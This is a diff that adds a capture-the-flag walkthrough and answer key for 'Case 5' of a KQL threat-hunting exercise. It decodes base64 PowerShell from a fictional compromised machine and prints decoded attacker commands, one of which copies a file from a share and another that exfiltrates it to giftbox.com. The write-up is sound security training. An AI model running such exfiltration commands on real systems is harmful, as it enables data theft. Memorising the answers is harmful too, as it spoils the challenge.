@@ -1,0 +1,51 @@
+Start with KQLKrakenHuntOnboarding.txt if you haven't.
+
+
+"Case 5" message:
+
+Wow, you're unstoppable! Great work finding the malicious activity on Alabaster's machine. I've been looking a bit myself and... I'm stuck. The messages seem to be garbled. Do you think you can try to decode them and find out what's happening?
+
+Look around for encoded commands. Use your skills to decode them and find the true meaning of the attacker's intent! Some of these might be extra tricky and require extra steps to fully decode! Good luck!
+
+If you need some extra help with base64 encoding and decoding, click on the 'Train me for this case' button at the top-right of your screen.
+
+
+==========
+When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?
+
+  Query from case 4:
+    ProcessEvents
+    | where timestamp >= datetime("2023-12-02T10:14:21Z")
+    | where hostname == "Y1US-DESKTOP"
+  Filter the process_commandline to contain "powershell"
+  2023-12-15T11:20:14Z has an encode powershell, but that's on other hosts too.
+  2023-12-24T16:07:47Z has the first attacker's command.
+
+Answer: 2023-12-24T16:07:47Z
+
+
+==========
+What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)
+
+  Copy and paste the command into CyberChef.
+  Recipe: From Base64, Reverse
+  => Copy-Item \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt
+
+Answer: NaughtyNiceList.txt
+
+
+==========
+The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?
+
+  Copy and paste the command at 2023-12-24T16:58:43Z into CyberChef.
+  Recipe: From Base64
+  => ...[ChaR[]](100, 111, 119, 110, 119 ...
+  Copy and paste the numbers from the above excerpt into a new tab.
+  Recipe: From Decimal
+  => downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
+
+Answer: giftbox.com
+
+
+==========
+Continue Onto KQLKrakenHuntCase6.txt
